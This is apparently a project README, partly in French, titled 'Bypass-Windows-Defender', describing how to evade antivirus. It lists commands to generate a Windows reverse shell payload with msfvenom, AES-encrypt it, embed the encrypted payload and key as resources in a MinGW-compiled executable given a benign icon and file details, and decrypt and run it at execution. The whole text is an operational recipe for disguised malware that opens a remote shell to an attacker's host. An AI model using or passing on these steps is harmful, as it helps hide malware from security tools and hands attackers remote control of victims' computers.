# BWD
Bypass-Windows-Defender

Bypass Windows Defender by encrypt the payload and execute it with the key at the same time. 

Prérequis
```
sudo apt update
sudo apt upgrade
sudo apt install wingw-w64
```


Récupérer demo.rc sur https://blog.didierstevens.com/2018/09/17/quickpost-compiling-exes-and-resources-with-mingw-on-kali/

icons dispo sur icons-icons.com au format .ico 512 pixels
```
x86_64-w64-mingw32-windres demo.rc -o demo.o
```
<br>

Ajouter une icon sur le .exe : 
```
x86_64-w64-mingw32-g++ -o helloworld.exe helloworld.cpp demo.o
```

Pour changer les informations du .exe changer le nom de demo.rc

<br>

Creation of the revershell with msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=@IP_host PORT=@Port_listen -f raw > 8443.bin
```

<br>

Meterpreter in helloworld2.cpp
```
x86_64-w64-mingw32-g++ -o helloworld.exe helloworld2.cpp demo.o
```

<br>

Python programm aes.py to have a cipher.bin and a key.bin (https://raw.githubusercontent.com/TheD1rkMtr/FilelessPELoader/) 

Ajouter dans demo.rc

```
#define IDI_BIN2    103

...
IDI_BIN1        BIN1        "cipher.bin"
IDI_BIN2        BIN2        "key.bin"
```

Copy of the fonction decryptaes in reverse.cpp : 
(https://raw.githubusercontent.com/TheD1rkMtr/FilelessPELoader/main/FilelessPELoader/FilelessPELoader.cpp)

```
x86_64-w64-mingw32-windres demo.rc -o demo.o
x86_64-w64-mingw32-g++ -o helloworld.exe helloworld.cpp demo.o --static
```










